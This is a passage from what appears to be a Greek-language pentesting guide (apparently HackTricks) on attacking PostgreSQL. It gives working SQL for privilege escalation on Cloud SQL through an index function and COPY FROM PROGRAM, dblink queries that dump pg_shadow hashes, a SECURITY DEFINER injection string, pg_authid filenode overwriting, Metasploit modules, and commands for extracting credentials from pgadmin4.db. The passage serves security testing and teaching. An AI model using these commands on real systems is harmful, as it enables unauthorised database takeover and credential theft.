4. ALTER τον ιδιοκτήτη του πίνακα σε "cloudsqladmin," ο οποίος είναι ο ρόλος superuser του GCP που χρησιμοποιείται αποκλειστικά από το Cloud SQL για τη διαχείριση και συντήρηση της βάσης δεδομένων.
5. Εκτελέστε μια λειτουργία ANALYZE στον πίνακα. Αυτή η ενέργεια αναγκάζει την μηχανή PostgreSQL να αλλάξει στο πλαίσιο χρήστη του ιδιοκτήτη του πίνακα, "cloudsqladmin." Ως εκ τούτου, η κακόβουλη λειτουργία ευρετηρίου καλείται με τα δικαιώματα του "cloudsqladmin," επιτρέποντας έτσι την εκτέλεση της προηγουμένως μη εξουσιοδοτημένης εντολής shell.

Στο PostgreSQL, αυτή η ροή φαίνεται κάπως έτσι:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Στη συνέχεια, ο πίνακας `shell_commands_results` θα περιέχει την έξοδο του εκτελούμενου κώδικα:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Τοπική Σύνδεση

Ορισμένες κακώς ρυθμισμένες εγκαταστάσεις postgresql μπορεί να επιτρέπουν τη σύνδεση οποιουδήποτε τοπικού χρήστη, είναι δυνατή η τοπική σύνδεση από το 127.0.0.1 χρησιμοποιώντας τη **`dblink` function**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Σημειώστε ότι για να λειτουργήσει το προηγούμενο ερώτημα **η συνάρτηση `dblink` πρέπει να υπάρχει**. Αν δεν υπάρχει, μπορείτε να προσπαθήσετε να την δημιουργήσετε με
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Αν έχετε τον κωδικό πρόσβασης ενός χρήστη με περισσότερα προνόμια, αλλά ο χρήστης δεν επιτρέπεται να συνδεθεί από εξωτερική IP, μπορείτε να χρησιμοποιήσετε την παρακάτω συνάρτηση για να εκτελέσετε ερωτήματα ως αυτός ο χρήστης:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Είναι δυνατόν να ελέγξετε αν αυτή η συνάρτηση υπάρχει με:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Προσαρμοσμένη καθορισμένη συνάρτηση με** SECURITY DEFINER

[**Σε αυτή την αναφορά**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), οι pentesters κατάφεραν να αποκτήσουν δικαιώματα μέσα σε μια postgres instance που παρέχεται από την IBM, επειδή **βρήκαν αυτή τη συνάρτηση με την ένδειξη SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Όπως [**εξηγείται στα έγγραφα**](https://www.postgresql.org/docs/current/sql-createfunction.html), μια συνάρτηση με **SECURITY DEFINER εκτελείται** με τα δικαιώματα του **χρήστη που την κατέχει**. Επομένως, αν η συνάρτηση είναι **ευάλωτη σε SQL Injection** ή εκτελεί κάποιες **προνομιακές ενέργειες με παραμέτρους που ελέγχονται από τον επιτιθέμενο**, θα μπορούσε να καταχραστεί για **να κλιμακώσει τα δικαιώματα μέσα σε postgres**.

Στη γραμμή 4 του προηγούμενου κώδικα μπορείτε να δείτε ότι η συνάρτηση έχει την ένδειξη **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Και στη συνέχεια **εκτελέστε εντολές**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Παράκαμψη Burteforce με PL/pgSQL

**PL/pgSQL** είναι μια **πλήρως χαρακτηριστική γλώσσα προγραμματισμού** που προσφέρει μεγαλύτερο διαδικαστικό έλεγχο σε σύγκριση με το SQL. Επιτρέπει τη χρήση **βρόχων** και άλλων **δομών ελέγχου** για την ενίσχυση της λογικής του προγράμματος. Επιπλέον, οι **δηλώσεις SQL** και οι **triggers** έχουν τη δυνατότητα να καλούν συναρτήσεις που δημιουργούνται με τη **γλώσσα PL/pgSQL**. Αυτή η ενσωμάτωση επιτρέπει μια πιο ολοκληρωμένη και ευέλικτη προσέγγιση στον προγραμματισμό και την αυτοματοποίηση βάσεων δεδομένων.\
**Μπορείτε να καταχραστείτε αυτή τη γλώσσα για να ζητήσετε από το PostgreSQL να κάνει brute-force τα διαπιστευτήρια χρηστών.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc με την Επικαλύψη Εσωτερικών Πινάκων PostgreSQL

> [!NOTE]
> Ο παρακάτω privesc φορέας είναι ιδιαίτερα χρήσιμος σε περιορισμένα SQLi συμφραζόμενα, καθώς όλα τα βήματα μπορούν να εκτελούνται μέσω εσωτερικών δηλώσεων SELECT

Εάν μπορείτε να **διαβάσετε και να γράψετε αρχεία του διακομιστή PostgreSQL**, μπορείτε να **γίνετε superuser** επικαλύπτοντας το filenode του PostgreSQL στον δίσκο, που σχετίζεται με τον εσωτερικό πίνακα `pg_authid`.

Διαβάστε περισσότερα για **αυτή την τεχνική** [**εδώ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Τα βήματα της επίθεσης είναι:

1. Αποκτήστε τον κατάλογο δεδομένων του PostgreSQL
2. Αποκτήστε μια σχετική διαδρομή προς το filenode, που σχετίζεται με τον πίνακα `pg_authid`
3. Κατεβάστε το filenode μέσω των συναρτήσεων `lo_*`
4. Αποκτήστε τον τύπο δεδομένων, που σχετίζεται με τον πίνακα `pg_authid`
5. Χρησιμοποιήστε τον [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) για να [επεξεργαστείτε το filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); ρυθμίστε όλες τις boolean σημαίες `rol*` σε 1 για πλήρη δικαιώματα.
6. Επαναφορτώστε το επεξεργασμένο filenode μέσω των συναρτήσεων `lo_*`, και επικαλύψτε το αρχικό αρχείο στον δίσκο
7. _(Προαιρετικά)_ Καθαρίστε την κρυφή μνήμη του πίνακα από τη μνήμη εκτελώντας ένα δαπανηρό SQL query
8. Τώρα θα πρέπει να έχετε τα προνόμια ενός πλήρους superadmin.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Μέσα στο _**postgresql.conf**_ αρχείο μπορείτε να ενεργοποιήσετε τα logs του postgresql αλλάζοντας:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Τότε, **επανεκκινήστε την υπηρεσία**.

### pgadmin

[pgadmin](https://www.pgadmin.org) είναι μια πλατφόρμα διαχείρισης και ανάπτυξης για το PostgreSQL.\
Μπορείτε να βρείτε **κωδικούς πρόσβασης** μέσα στο _**pgadmin4.db**_ αρχείο\
Μπορείτε να τους αποκρυπτογραφήσετε χρησιμοποιώντας τη _**decrypt**_ συνάρτηση μέσα στο σενάριο: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Η πιστοποίηση πελάτη στο PostgreSQL διαχειρίζεται μέσω ενός αρχείου ρυθμίσεων που ονομάζεται **pg_hba.conf**. Αυτό το αρχείο περιέχει μια σειρά από εγγραφές, κάθε μία από τις οποίες καθορίζει έναν τύπο σύνδεσης, εύρος διευθύνσεων IP πελάτη (αν εφαρμόζεται), όνομα βάσης δεδομένων, όνομα χρήστη και τη μέθοδο πιστοποίησης που θα χρησιμοποιηθεί για την αντιστοίχιση των συνδέσεων. Η πρώτη εγγραφή που ταιριάζει με τον τύπο σύνδεσης, τη διεύθυνση πελάτη, τη ζητούμενη βάση δεδομένων και το όνομα χρήστη χρησιμοποιείται για την πιστοποίηση. Δεν υπάρχει εναλλακτική ή αντίγραφο αν η πιστοποίηση αποτύχει. Αν καμία εγγραφή δεν ταιριάζει, η πρόσβαση απορρίπτεται.

Οι διαθέσιμες μεθόδοι πιστοποίησης με βάση τον κωδικό πρόσβασης στο pg_hba.conf είναι **md5**, **crypt** και **password**. Αυτές οι μέθοδοι διαφέρουν στον τρόπο μετάδοσης του κωδικού πρόσβασης: MD5-hashed, crypt-encrypted ή clear-text. Είναι σημαντικό να σημειωθεί ότι η μέθοδος crypt δεν μπορεί να χρησιμοποιηθεί με κωδικούς πρόσβασης που έχουν κρυπτογραφηθεί στο pg_authid.

{{#include ../banners/hacktricks-training.md}}
